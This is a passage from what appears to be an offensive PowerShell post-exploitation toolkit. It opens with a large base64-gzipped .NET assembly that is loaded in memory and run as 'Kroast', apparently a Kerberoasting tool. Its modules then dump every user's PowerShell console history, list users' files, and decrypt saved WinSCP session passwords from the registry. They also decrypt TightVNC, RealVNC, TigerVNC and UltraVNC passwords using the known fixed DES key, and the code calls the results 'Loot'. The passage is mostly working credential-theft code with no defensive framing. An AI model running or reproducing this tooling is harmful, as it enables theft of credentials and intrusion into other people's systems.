wEO2W8SGcA/wt7mG9hBPCjM0O0ip7xH+2OG7wFfWvJx6ybAlPWAeErcoz4mHgf/SYY1gP87+Iy4WTkR+idxq/IN80VIPqP+CrAf+1aqpShdyuuClkI6w8oPuRbBiPIehdoly9eyTJNys/KV0HplIbe7UFyqZoH3h04q9yrrQncD/r19N0s+zPAR5Tcs+RvxIfVJheA/AA4Gn2X8VwxfguRP/D61S3khcALwAe7LU0ZeVcAvAd6MfYgP+FsAH9HeoTrA7wC8Fvw66H8ecMT+DeCXsfOvE/cHFG0VvBrHyDwcbAIkv61nS9azzetZcr0Ysvu1TTyan1GuNAaA94eeQeuHQ0Oaovza95JQlM9ZBLeHCAYDBDsNgp9RCT4KaGP+3KFFMDOX6zaou4D7GA+K92s2Ti0fBFwoHgSsFR8DrBOfAEyKRwBXic8DpsQXARvF/wBsFV8DXC8eB+wU3wa8THwPOrewzivEs+D0iB8B7hT/Arib4T7xPOCA+DfAQfEbwNeKlwGPCA21xoQNeFyEAMdFBHBKxAFLog7wNGt+PXphi7Ow3xZvguXNOLX9xmjG6Uk1m3H+WA64UjQApsVGwA6GlzLsZv6V4jLAg8x5DcNRMQB4UrwBsCj+yNQX3oBWxhi+ieFyaNgD+94vHsLMWqlsVXYp1yo3KW9V3qHcp/yV8iXl75TnlJ8rmrpArVPXqpeover96gPqQ+qfq3+pflFt116nHdMmtFPa6zWT78rEg88he7zeIPhz5aeAJ9UXAfMWca5heL/5S6xcCyizYnw05AsH46cIGkUVPbYEnQwtynoYSxVnuABgXIQAk6i3RLxO+ZEa0lZqOzX9rHc3yPs8Haz8vQr6vFH7PAtU896mjQdm896onbTn8gzmUTYriktlQ33d+YmpTCFbONImdueKJVz6irszpdxkm+jJjubHsocGtne0i97JCt43WQI8mC+UsmM9udFSLj+ZKZw50k4VuHTjeijp69pQ0dC2saIBeJnfWWF3isv25Memx7OXi+69e/Z1Heg9MLy7d7Cve++OA137dvZ1i97+Q3t6D3QN9PaIA727uwb6DvcO7+3rEXsyJ7N03ZEt0eVg7/5Dvf3dvWLb3r27h7d37T7YK/Yd6DuMipI1cOBQr+je2XWgq3sAjRwcONDXv0PsBTHgEdv6yuiB3q7doncQkv1ADvWj1QMHgfUf2r2b9fV29Yuufft293XDpL394uC+frFvT+9w10HgZ4ql7ERz317R1z/Qu6P3gNi7bVdv98BwX09v/0Df9j5wDvYOoMcoHhwQvXu29fb09PYM7+s5zC0MHxbF6ZFhUcocO5wZn84y1j2eKRaHxURxNF8Yz42wA/hm5bFsafjg9Igoutfu49nRk/3TE4TDO8xyx3t39nRulP7qytTx3KhnZ3d+fDzLA1ps3pGdzBZQVBpltfsK+alsoZTLFgfyu/OZMdE1NsYNY7yzx7KFg7ljk9kxMVoAIPlu6CgVpkcRI9KMasZktkiXeVo9OJUdzWXGc9ejuD973Y7pHFqamspOjomeTCk7kJvIXpmblE0cRBS56J7c+Hiu6NL5/BjCavf0mDiQnRrPjGbdeHNjTUxki8XMsSz14EBmEgh1Q/T15IpT+WJmZBx4cV8hN1linOzO40rN9GcmsmIsP5HJTTI6XcwWGDk00E2miW2ZMb6y82Q3mKYWGCEth0qjXl/EQP7QZO5UtlDMjLsVS3y9qpArZXfnJrOidGYq642akDZm4Zpj0CDIPV2lUiE3Ml2iXo5MHztGRld4qHg4V8zN4HUVi9mJkfEzA7nSvOxCZiw7kSmcrBQNZAowfHsBXb0uX13g1dmeG88eRi8whnML4cGjuWPThUxp3uKebHG0kJuaWUgdzo1zjQPZ8cxpxopzKyMsxxBT8zU6daaQO3a8qmhfBh3oKhQyZ+YTh4MnqwoOTE+WMBDML+VGcuO5UlWpjLlJQjHk286U3BFjjCcqYzLgmOYqA+4s5glaJry5TYMvETJeYqcYUvggIidyJcSKnE4V8spCPlMsNWdPS7mDyIJHkYXHsqdxzY+c2Hv0qKxCCPTRZaxYokv+KEtsmz4qRqZdKZjlTUzXB83uyOYmj4mBjW3yMYpAfncxSt4uum3PPhfbITOLSyEHUTJxKTZTouV55tJusLqU6zNPpZxUXqvevHFpyA3ky5KlCrYXKadU1fK2XFVhhRjIjmdL2dNlO8ay+QqJzFl0Dc4WjuYLEz25AlJWvnDmYDZTGD0OxaXjbO7u7OQxF5WjP1bF4TF1adjrYvLiEtnTmdGSi4/kPKx3cqx4VQ7IwVKmUJIox2B+Elg5XLqPT0+eRHIo0SztRirOYgAz4954ImFOI0rPNJPXR3NTKDlVKe1j6dIZrMLZcSSmk9nJvgnk/CKWd5p9u7OnwN+O7Ns1Pu4tLcD2ZCfID6VCNjOB8eS/5MXG9UErRzojshUxnptAekU8sPfzyKyZSUEp7yDmHwUjekxW0WUic5ouV2YLI9lCvngge+00Fo58wesH2yjG8a1a6DAtMRoA0N89XSigUz2cscX0TLJS3jVKE6k8pG65zPNiAl9vPmSPugsVVpbi9HjJXRRd55eXMSGjpprBUSIrVbFnaqkqmGURMhdGhgr69vaeHs1yshTFqUleEMYzZw5hIeqbPJp3VzqERd5NPoyOlfLlJahrGgQNzxBsouzVfRzX45miG647s0j/BbcL26Zz40RVLfTkNw+dNQvAKXqIzEo8Qjszk2PjrpJy2uqbxGQWZDevohwnWEVKQL31Iiu1ulzMVBRgyhOxu6drX8U7hfwolvR8QfT1TlKiyYBLZlZRzaMS8mXvyAnUHPYWHnAwudknO/PTBdpwFb0h78lljk3mi6XcaHF2ViQnYOQOZguncmh/drFcwbAxmlVe5TO3QK7b8DbNvOKs3VYlbxQFVuHivLO1mf1cJM+VELNFgY1QcZ7tldyZYbyLAjk9d/SMxN00y9tKb2mShLfZFNOTGKUxjEFRuO6uDumiKLhXWDCaKblbtu1IlCCkuxGEnkVIUOXdHJYhtCgDbGJqPDeak0TvaZeobkfaLyctmhrL7stj+XD3m/A7xhEzBYsfQgz6ZQzSYlc2el+/m0UoPjx0T/5Utp/+mJ5r3wDhpVMzskrmNKWjquDfmT2Nho6OT5/m9nsyZ5AzeXeBK/lV4nJC9ucpR18wBJpnzXfP3AqjkM8jnEvAyjxJUi4dH99b6J2YKp0RYsFunOi7cIbfLFroj+ecfS4l1oiUyIsRcUJkcYwu4TsuMjgCFsUWMQ2YFQWxbo5MBhC7FnAL4swsyeX4enQXZEchNS0mUaMbGF0LuI7DiDbRLNrx7RTrRSuubfjXITbg30ammsGn0lZwN6OVduinFqTuUyIH3di5Ac9B7yjgFCwbF/2AEyjZIhq4hij+PvpZ5FZm9rDSsjh75/+jzqi/mOFi3avVJxb1cw+yIimOunrGhFh7yLUoOc+/zfjegB7cCLmD0N0/r9QMuVBL2X+bhXBa0EYe7WfYKnC0JqEoYs8qcRISI/AWZjzkV7n16drmXtv52gCsA9gVLqeBy9a7Mhuozd4La2uYo09qm0eL5fYggZ0L9CTZ21iYecynOcCy5LGlXvkU+3oC3xK+p8jHTVSWRB2SP+5iI6JpRpiStyYxvsryaR6P09CULetP4ppBL0hKbLmO420SNNWZRmsj7mjlMYoV/VmMdJbHmaKjyLWVxUnE22z9rFdDXHV4/aA6FA/HZlg8r8Y4aZzgsaSekz2sr6UEDdRzGulJTL1XpycD22boWUzZbp/YLfow37rEAK57EXUUSd2MDYheMQhInH3iAMoPs1wvcRJ9kCCa6veAI0e0xY0BsWAbdOxFaS9k+kH3uRp34HsAM2Qb6g2IYXEQkHT309/DWrwXtpDUnBJfvzgEbbuFWLlXbBO7INPNUtR6L+vuE9vxZe2QqcTAMCRwcgRe4Jla4pQlHNk7ku/nfgjfAbYW2CLSeEjs4VLZ5x5Y1wvONsZ7GA7TOwXwglh0CDLbkYEOcgTnOIrEYtK32/XtYeDD8AjZK5yDoPajBWqnG1BYB7nXYmk/j1CWtYzO1JfwMg5F7QiP9YzypQNuBJQ4EmeU1R8GNgZ+fr7SaB+s3DCTt4D6RD7OyZyW2MFxRZZRrsuJ6znGy+VLd3DJFCJ7juVLqfUivvNZPVPvzB4f4ug/xaXFueXLu8VOWE5j1O2O5ay4iW7DmO2bWQuj1e+OyAGU0IgjopeX2IIc901mgWOgKddRjkAPV8tskYQ9ZMk05/e8a91RcPL0E+src5zts+DIuVtiuXHu5TFQNPNHULvEeeai+S8xs9actpZTC6fc8Rhz89Y4/nmZTdRf1NYEZbajvIaU5itvmq1/prZKXc4oe1+ttLeCUWaa2cMtXEYZBFlz9GL6rhPSz2Snp2+zW5f0VsvO10a7bOPS2W3MzFukaf6xQd0tr1x3vpZbL9DyzAx50ZY3vXLduS23Us1LZP7IckQX5hlzqjvJ5ZnyWvtq600BK1at0Z6lM+tNu7FGa2qGo5Xqy/W4wGsazzZfK7JUK73xbBAmQuS5zcjZNHKia67vaT1Jzpj9F/Xh1ler4QKevPLV1i/yXCxwr2Xt06K6L9C1YbYub7W7aA8uuViti0Re4noeizx2DDOl5OqkzLFmr7vGJzmnFdgWymFn3NxG2ufGc6XWK8XO3DxTqSt7PVk+cCArdo9ylHi5k+oedTUXq/I81T3D+7HKntnLEHNn0MyaF/F6xzTzp6F5incS3l7ywm2LdbNbk/uFJuwYZtZT5sS1J9mGs85M2c3zZrYLa+hAtL0qDdfMv1eujPfsCJZjMNsDcoZ7fvDyujg2v3baw2d4/ktegS1Pl9tZ/x9tZ+uFo2TMjaWLRkjLhcZ5/tpCu5pzlvwnOmaPgrfizfb/Wre9tUJZO7uOt9+oHMi5pQvKVdY8eaLpmxPjOchNuv2YPStTfHaY4l4hzl8zu/Z8Z6Jp5hbLEZLjc4c3TvNlRLZsTuaS832mDclZ5xnY1D273n8katy99zqvrZna58lKc1qrWDn/eW72+QsWH7ywjupcOrvm7HWysi6um5P/spwd87znTMJvWfZIJeIyrG/Wbv5K6aExnr8UgRW8vQrvqMLXV+Ebyjiivs/Ttf4/qUsskjY3l7W0zcudX7bjorO25PZ81qzFZ0/DhpeP7byr5+4zv7r6UOiNR4WeVBRbQyI0gDgOkWECqrkoMq3UG4alhiO9ulDUMKTChlDD4bAuRKTPtNTI/sgeqgeBpIjs0SwlbAoNAmED9NkHqaw+HLBMNXIoMhQOR64huUNQVMcCD6ElNWwmlcjZj1OrdWSJisYUakgJ19mWEQ7Xh20qDNvLrUgkV2/UG35nQq2P1NqR2moYDtv0v8qY8Cd1Jeyc/Uwki2qi3ggKAw38jU1f2xBKGL1KUjfQmE2YbZvUrfo6eoXTTKLhSMZn6bZUi17JWrJvdXVmjSLqlwnNr9T5Lcumj1pvRC2/RCO1iyJnFK5qSozcEBXocX1UhKyA7X1U228Zbiu2bsHbQVcJf+ACwBC14MrYtiV0MqGOx6HOhJGoAAv9fsuM3FhvcD3480aNIXyrAkJQgxID7rQjN/pVKSKhHyNcr9k8VFrQ8gF3P+gcDGB6gRVUGfHRh4zyg9TwIcFV1mJYA1lVdauGbZQ6Z29xzt7qnL0Z/0UyGEHNBrC1UNJWXDnn7FNwC8rNpKaw6SBumSFwi27RX4pFGIbhokitRQNjoL98DQRWWD7y+NlzGAMZCdJZi5yz72FWpNZXLvahlxTXUWFhmKMiqgSSAqV3qIT7GCM54lJ9yfU0IZqiyiIrSKPqt/2Rs/eww4HaBvPgxKigTioGRZ4Gf0MCzjAsdhRMRhTeY4OkoCMSn09f/9rDi9c/e6v98Nbhm5xv+TfrCr2VRb8K1/n/oUQvaOn0h810+lmgTr8R1OktLZ3+cqhOPxfU6eUu+jGT0OkvQur0U0WdfleoRwjQD9R1+mW5vohAjAD9dWm9lgD9DVSd/jC8Tn/BQ6c/CavTz9H1Zd7LYappa2a9oZqqbsK7lpsbNBOxTfM0bAk1sifSixmiKpH98rIHc5imv42uYLJFsjQBMCco0HhOYJgw+xQOdLgD054mItjwmdD4YpNiIKoPPWGG6giOZLuG/qkEyQSbQ8tGuHNhkjwrEcVFMIIkjDmPYVL99PN1hVgwL8zDaGF2E0LGY+go5REeWUhqFcQoSWAwa1TJDZORuEQybCRaYSO5NbafGvYLQyKceSK1foYBW9ZAQLqCcCr3HITkEEPlQOYa5FJQ5NJ6gwg7TKYTjyxzkVtZCRju9VaL/YGRSiHTpcj9wFR8wzb9ppE+y+iHjgNq7KpCZqo/P1l+cjxwvJC/rqhATv7vogKKMN1nZUL+DDWuiEj5DZrkFx9MJttb29dj06GIVdlLOtvWH23vaNo4NpptWt95SaZpU3bT+qa2TPtI62jH2IajGzuFCCrCamtupX9YWRWxpLm/d6D8BlGj+0rJllPrmzthY3hhuch9ok2vVUWoTrJckoSsmPmZ9//D9f8//4UflccgKcRZSjj75P/ireojf6XdOQ+fPrOYZfnjF5C/G0nz9g8gurRKSVCjn8odxu58uHwvVD4DGOa9+nb+Q5FCfF5//uXqX1x7160upYvZb98K/lsNCrTSTnQ731PNij4+geW5fBXXGnD3tUU+39AOjc7c8vOwPs6/Fam+cztX006WaS3/W48zCP3gcAn7o5ufh1V21fKzoqpsyn2GUn5y53428vvHXnuznx9U7LyS76NkeBdPn1b+VbRX77B737oiT88qW8tfaicA+T73JFbAdcZzxBn6m/nULG3cKSKot9u9TzfOvZlCPwp8wjvO1szlJcWDgp4htqPtdkGj38C+qOiRIzLGZxEau5NlrwlxOdu619WXc231+jr5ijY3s0/3cemYe0+l2u+zfbmefTlTfrZHZ/uzk+t08Vk5y6fVcT5JvlK9j94vxL9UBfHzn/3CZVtPT4wnT7n5dgVy8opkll71yU0e27Li0MD2ps4VyWIpMzmWGc9PZresOJMtrth6ecgf8l+Wcd+OTELFZHHLiunC5Obi6PHsRKbYNJEbLeSL+aOlptH8xOZMcaL5VNuK5ERmMnc0Wywdrm4PypLJsjLvzZUZNtG/FclJZPotK/ac6Zqilz/4rbPmzNTUihapoVSYLpboNadXaU+7bBk1i+4bYy4NTkG++5Ed21fIncqNZ49li69Sa8eKspZqPb2n0Ub5PbnkOMEtKzLFvslT+ZPZworkdK5rlF7q2LLiaGa8mHU7xUpa5rHGM71lhu2XtZSdAPqyFs+pl4v/ss//AXIB3CgAdAAA"))
    $gzipStream = New-Object IO.Compression.GzipStream($kr, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [Kroast.Program]::Main([string[]]$args)
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString() | Write-Output
}
'@

    
################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

################################################################################################################
######################################## Module: ConsoleHistory ################################################
################################################################################################################

$Global:ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@

################################################################################################################
########################################### Module: Files  #####################################################
################################################################################################################

$Global:Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@

################################################################################################################
############################################ Module: SCCM ######################################################
################################################################################################################


$Global:LocalSCCM = @'
function Invoke-LocalSCCM {

    $lss=New-Object IO.MemoryStream(,[Convert]::frOMbaSe64StrInG(""))
    $gzipStream = New-Object IO.Compression.GzipStream($lss, [IO.Compression.CompressionMode]::Decompress)
    $memStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo($memStream)
    $reflectedAssembly = [System.Reflection.Assembly]::Load($memStream.ToArray())
    $currentConsoleOutput = [Console]::Out
    $textWriter = New-Object IO.StringWriter
    [Console]::SetOut($textWriter)
    [LocalSCCM.Program]::Main()
    [Console]::SetOut($currentConsoleOutput)
    $textWriter.ToString() | Write-Output
}

$Out = Invoke-LocalSCCM 
$Out | Out-string
'@ 

################################################################################################################
############################################ Module: WinSCP ####################################################
################################################################################################################

$Global:LocalWinSCP = @'

function Get-MappedSID {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Hive
    )
  
    $SID = (Split-Path $Hive -Leaf)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier($SID)
    return $objSID.Translate([System.Security.Principal.NTAccount])
}
  
function Decrypt-NextCharacterWinSCP {
    param (
        [Parameter(Mandatory = $true)]
        [string]$RemainingPass,
        [Parameter(Mandatory = $true)]
        [int]$Magic
    )
  
    $firstVal = ("0123456789ABCDEF".IndexOf($RemainingPass[0]) * 16)
    $secondVal = "0123456789ABCDEF".IndexOf($RemainingPass[1])
    $added = $firstVal + $secondVal
  
    $decryptedResult = (((-bnot ($added -bxor $Magic)) % 256) + 256) % 256
  
    return [PSCustomObject]@{
        Flag          = $decryptedResult
        RemainingPass = $RemainingPass.Substring(2)
    }
}
  
function Decrypt-WinSCPPassword {
    param (
        [Parameter(Mandatory = $true)]
        [string]$SessionHostname,
        [Parameter(Mandatory = $true)]
        [string]$SessionUsername,
        [Parameter(Mandatory = $true)]
        [string]$Password
    )
  
    $CheckFlag = 255
    $Magic = 163
    $key = $SessionHostname + $SessionUsername
  
    $values = Decrypt-NextCharacterWinSCP -RemainingPass $Password -Magic $Magic
    $storedFlag = $values.Flag
  
    if ($storedFlag -eq $CheckFlag) {
        $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass.Substring(2) -Magic $Magic
    }
  
    $len = $values.Flag
    $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass -Magic $Magic
    $values.RemainingPass = $values.RemainingPass.Substring($values.Flag * 2)
  
    $finalOutput = ""
    for ($i = 0; $i -lt $len; $i++) {
        $values = Decrypt-NextCharacterWinSCP -RemainingPass $values.RemainingPass -Magic $Magic
        $finalOutput += [char]$values.Flag
    }
  
    if ($storedFlag -eq $CheckFlag) {
        return $finalOutput.Substring($key.Length)
    }
  
    return $finalOutput
}
  
function Invoke-WinSCPDecryptor {
    param ()
    [bool]$Loot = $false

    $userHives = Get-ChildItem Registry::HKEY_USERS -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$' }
  
    foreach ($hive in $userHives) {
        $objUser = Get-MappedSID -Hive $hive.Name
        $source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)
        $winSCPPath = Join-Path $hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  
        if (Test-Path $winSCPPath) {
            $allWinSCPSessions = Get-ChildItem $winSCPPath
  
            foreach ($session in $allWinSCPSessions) {
                $pathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $session
                $winSCPSessionObject = [PSCustomObject]@{
                    User   = $source
                    Session  = (Split-Path $session -Leaf)
                    Hostname = (Get-ItemProperty -Path $pathToWinSCPSession -Name "HostName" -ErrorAction SilentlyContinue).HostName
                    Username = (Get-ItemProperty -Path $pathToWinSCPSession -Name "UserName" -ErrorAction SilentlyContinue).UserName
                    Password = (Get-ItemProperty -Path $pathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password
                }
  
                if ($winSCPSessionObject.Password) {
                    $masterPassUsed = (Get-ItemProperty -Path (Join-Path $hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword
  
                    if (!$masterPassUsed) {
                        $winSCPSessionObject.Password = Decrypt-WinSCPPassword -SessionHostname $winSCPSessionObject.Hostname -SessionUsername $winSCPSessionObject.Username -Password $winSCPSessionObject.Password
                    }
                    else {
                        $winSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
                    }
                }
  
                if ($winSCPSessionObject.Username -eq $null -and $winSCPSessionObject.Password -eq $null) {}
                else { 
                    $Loot = $true
                    $winSCPSessionObject | Format-Table -AutoSize | Out-String
                }
            }
        }
    }
    
    if (!$Loot){return "No Results"}
}
  
Invoke-WinSCPDecryptor

'@

################################################################################################################
############################################ Module: VNC #######################################################
################################################################################################################

$Global:LocalVNC = @'

function VNC-Decrypt {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Password
    )
    
    # Convert the encrypted password from hex to bytes
    $encryptedBytes = [byte[]]::new($Password.Length / 2)
    for ($i = 0; $i -lt $Password.Length; $i += 2) {
        $encryptedBytes[$i / 2] = [Convert]::ToByte($Password.Substring($i, 2), 16)
    }
    
    # Fixed DES key and initialization vector (IV)
    $desKey = [byte[]](0xe8, 0x4a, 0xd6, 0x60, 0xc4, 0x72, 0x1a, 0xe0)
    
    $des = [System.Security.Cryptography.DES]::Create()
    $des.Key = $desKey
    $des.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $des.Padding = [System.Security.Cryptography.PaddingMode]::None
    
    # Ensure the encryptedBytes array length is a multiple of the block size (8 bytes)
    if ($encryptedBytes.Length % 8 -ne 0) {
        $paddedLength = [Math]::Ceiling($encryptedBytes.Length / 8) * 8
        $paddedBytes = [byte[]]::new($paddedLength)
        [Array]::Copy($encryptedBytes, $paddedBytes, $encryptedBytes.Length)
        $encryptedBytes = $paddedBytes
    }
    
    # Decrypt the encrypted bytes
    $decryptor = $des.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    $decryptedPassword = ([System.Text.Encoding]::ASCII.GetString($decryptedBytes)).Trim([char]0)
    $decryptedPassword = $decryptedPassword.Substring(0, [Math]::Min($decryptedPassword.Length, 8))
    
    return $decryptedPassword
}

function GetRegistryValue {
    param (
        [string]$Path,
        [string]$Key
    )
    
    try {
        $regKey = Get-ItemProperty -Path "HKLM:\$Path" -Name $Key -ErrorAction Stop
        $value = $regKey.$Key
    
        if ($value -is [byte[]]) {
            # Convert REG_BINARY to a hexadecimal string
            return [BitConverter]::ToString($value).Replace("-", "")
        } else {
            # Return REG_SZ or other types as is
            return $value
        }
    } catch {
        return $null
    }
}

function Search-TightVNC-Passwords {
    $TightVNCServerPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "Password"
    $TightVNCServerControlPassword = GetRegistryValue -Path "Software\TightVNC\Server" -Key "ControlPassword"
    $TightVNCServerPasswordViewOnly = GetRegistryValue -Path "Software\TightVNC\Server" -Key "PasswordViewOnly"
    
    if ($TightVNCServerPassword -ne $null -or $TightVNCServerControlPassword -ne $null -or $TightVNCServerPasswordViewOnly -ne $null) {
        try { $TightVNCServerPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerPassword ; $T1 = $true } Catch { $T1 = $false }
        try { $TightVNCServerControlPasswordPlaintext = VNC-Decrypt -Password $TightVNCServerControlPassword ; $T2 = $true } Catch { $T2 = $false }
        try { $TightVNCServerPasswordViewOnlyPlaintext = VNC-Decrypt -Password $TightVNCServerPasswordViewOnly ; $T3 = $true } Catch { $T3 = $false }
    
        if ($T1 -or $T2 -or $T3) { Write-Output "[TightVNC]" ; Write-Output "========================================" }
    
        if ($T1) {
            Write-Output "Encrypted Password : $TightVNCServerPassword"
            Write-Output "Decrypted Password : $TightVNCServerPasswordPlaintext"
        }
    
        if ($T2) {
            Write-Output "Encrypted Password : $TightVNCServerControlPassword"
            Write-Output "Decrypted Password : $TightVNCServerControlPasswordPlaintext"
        }
    
        if ($T3) {
            Write-Output "Encrypted Password : $TightVNCServerPasswordViewOnly"
            Write-Output "Decrypted Password : $TightVNCServerPasswordViewOnlyPlaintext"
        }
    }
}
    
function Search-RealVNC-Passwords {
    $RealVNCProxyUser = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyUsername"
    $RealVNCProxyServer = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyServer"
    $RealVNCPassword = GetRegistryValue -Path "SOFTWARE\RealVNC\vncserver" -Key "ProxyPassword"
    
    if ($RealVNCPassword) {
        $RealVNCPlaintext = VNC-Decrypt -Password $RealVNCPassword
        Write-Output "Proxy Server   : $RealVNCProxyServer"
        Write-Output "Proxy Username : $RealVNCProxyUser"
        Write-Output "Proxy Password : $RealVNCPlaintext"
    }
}
    
function Search-TigerVNC-Passwords {
    $TigerVNCPPassword = GetRegistryValue -Path "SOFTWARE\TigerVNC\WinVNC4" -Key "Password"
    if ($TigerVNCPPassword) {
        $TigerVNCPPasswordPlaintext = VNC-Decrypt -Password $TigerVNCPPassword
        Write-Output "Encrypted Password : $TigerVNCPPassword"
        Write-Output "Decrypted Password : $TigerVNCPPasswordPlaintext"
    }
}
    
function Search-UltraVNC-Passwords {
    param (
        [string[]]$Paths
    )
    
    $headerDisplayed = $false
    $regexPatterns = @("passwd=[0-9A-F]+", "passwd2=[0-9A-F]+")

    foreach ($path in $Paths) {
        if (Test-Path $path) {
            $fileContent = Get-Content -Path $path -Raw
            foreach ($pattern in $regexPatterns) {
                $matches = [regex]::Matches($fileContent, $pattern)
                foreach ($match in $matches) {
                    $encryptedPassword = $match.Value.Split('=')[-1]
                    try {
                        $decryptedPassword = VNC-Decrypt -Password $encryptedPassword
                            
                        if (-not $headerDisplayed) {
                            $headerDisplayed = $true
                        }
                        Write-Output "Encrypted Password : $encryptedPassword"
                        Write-Output "Decrypted Password : $decryptedPassword"
                    }
                    catch {
                        if (-not $headerDisplayed) {
                            $headerDisplayed = $true
                        }
                        Write-Output "Failed to decrypt password: $encryptedPassword"    
                    }
                }
            }
        }
    }
}

# Define UltraVNC paths to search
$UltraVNCPaths = @(
    "$env:SystemDrive\Program Files (x86)\uvnc bvba\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files\uvnc bvba\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files\UltraVNC\ultravnc.ini",
    "$env:SystemDrive\Program Files (x86)\UltraVNC\ultravnc.ini"
)
    
function VNC-Hunt {
    $Loot = $false

    Write-Output ""

    $realVNCResults = Search-RealVNC-Passwords
    if ($realVNCResults -ne $null) {
        $Loot = $true
        Write-Output "[RealVNC]"
        Write-Output "========================================"
        $realVNCResults | ForEach-Object { Write-Output $_ }
        Write-Output "========================================"
